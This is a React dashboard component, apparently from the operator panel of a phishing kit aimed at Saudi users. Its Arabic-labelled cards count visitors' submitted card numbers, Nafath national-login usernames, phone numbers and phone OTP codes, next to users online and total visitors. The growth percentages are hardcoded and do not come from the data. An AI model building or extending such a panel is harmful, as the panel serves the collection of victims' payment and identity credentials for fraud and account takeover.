"use client"

import { useMemo } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Users, CreditCard, Shield, Phone, TrendingUp } from "lucide-react"

interface StatsCardsProps {
  notifications: any[]
  onlineUsersCount: number
}

export function StatsCards({ notifications, onlineUsersCount }: StatsCardsProps) {
  const stats = useMemo(() => {
    const cardSubmissions = notifications.filter((n) => n.cardNumber && !n.isHidden).length
    const nafazSubmissions = notifications.filter((n) => n.nafadUsername && !n.isHidden).length
    const phoneSubmissions = notifications.filter((n) => (n.phone || n.phone2 || n.phoneOtpCode) && !n.isHidden).length
    const totalVisitors = notifications.filter((n) => !n.isHidden).length

    return [
      {
        title: "المتصلين الآن",
        value: onlineUsersCount,
        icon: Users,
        color: "emerald",
        trend: "+12%",
      },
      {
        title: "إجمالي الزوار",
        value: totalVisitors,
        icon: TrendingUp,
        color: "blue",
        trend: "+8%",
      },
      {
        title: "بيانات البطاقات",
        value: cardSubmissions,
        icon: CreditCard,
        color: "purple",
        trend: "+15%",
      },
      {
        title: "تسجيلات نفاذ",
        value: nafazSubmissions,
        icon: Shield,
        color: "orange",
        trend: "+5%",
      },
      {
        title: "أرقام الهواتف",
        value: phoneSubmissions,
        icon: Phone,
        color: "cyan",
        trend: "+22%",
      },
    ]
  }, [notifications, onlineUsersCount])

  const getColorClasses = (color: string) => {
    const colors = {
      emerald:
        "bg-emerald-50 dark:bg-emerald-900/20 text-emerald-700 dark:text-emerald-300 border-emerald-200 dark:border-emerald-800",
      blue: "bg-blue-50 dark:bg-blue-900/20 text-blue-700 dark:text-blue-300 border-blue-200 dark:border-blue-800",
      purple:
        "bg-purple-50 dark:bg-purple-900/20 text-purple-700 dark:text-purple-300 border-purple-200 dark:border-purple-800",
      orange:
        "bg-orange-50 dark:bg-orange-900/20 text-orange-700 dark:text-orange-300 border-orange-200 dark:border-orange-800",
      cyan: "bg-cyan-50 dark:bg-cyan-900/20 text-cyan-700 dark:text-cyan-300 border-cyan-200 dark:border-cyan-800",
    }
    return colors[color as keyof typeof colors] || colors.blue
  }

  return (
    <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-4">
      {stats.map((stat, index) => {
        const Icon = stat.icon
        return (
          <Card key={index} className={`border ${getColorClasses(stat.color)}`}>
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div
                    className={`p-2 rounded-lg ${
                      stat.color === "emerald"
                        ? "bg-emerald-100 dark:bg-emerald-800"
                        : stat.color === "blue"
                          ? "bg-blue-100 dark:bg-blue-800"
                          : stat.color === "purple"
                            ? "bg-purple-100 dark:bg-purple-800"
                            : stat.color === "orange"
                              ? "bg-orange-100 dark:bg-orange-800"
                              : "bg-cyan-100 dark:bg-cyan-800"
                    }`}
                  >
                    <Icon className="h-5 w-5" />
                  </div>
                  <div>
                    <p className="text-sm font-medium opacity-80">{stat.title}</p>
                    <p className="text-2xl font-bold">{stat.value.toLocaleString()}</p>
                  </div>
                </div>
                <Badge variant="secondary" className="text-xs">
                  {stat.trend}
                </Badge>
              </div>
            </CardContent>
          </Card>
        )
      })}
    </div>
  )
}
